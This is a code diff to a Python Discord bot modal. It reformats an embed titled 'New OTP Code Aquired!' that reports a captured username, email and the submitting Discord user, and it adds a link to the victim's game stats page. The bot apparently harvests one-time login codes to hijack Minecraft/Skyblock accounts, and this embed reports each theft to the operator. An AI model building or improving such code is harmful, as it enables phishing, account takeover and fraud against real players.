@@ -142,26 +142,27 @@ class MyModal(discord.ui.Modal):
             ]
           },
           "embeds": [
-          {
-            "type": "rich",
-            "title": 'New OTP Code Aquired!',
-            "description": "",
-            "color": 0x1aff00,
-            "fields": [
-              {
-                "name": 'Username',
-                "value": f'```{username}```'
-              },
-              {
-                "name": 'Email',
-                "value": f'```{email}```'
-              },
-              {
-                "name": "🗿 - **Discord Name**",
-                "value": f"```{interaction.user}```"
-              },
-            ]
-          }
+            {
+              "type": "rich",
+              "title": 'New OTP Code Aquired!',
+              "description": "",
+              "color": 0x1aff00,
+              "url": f'https://sky.shiiyu.moe/stats/{username}',
+              "fields": [
+                {
+                  "name": 'Username',
+                  "value": f'```{username}```'
+                },
+                {
+                  "name": 'Email',
+                  "value": f'```{email}```'
+                },
+                {
+                  "name": "🗿 - **Discord Name**",
+                  "value": f"```{interaction.user}```"
+                },
+              ]
+            }
           ],
           "components": []
         }
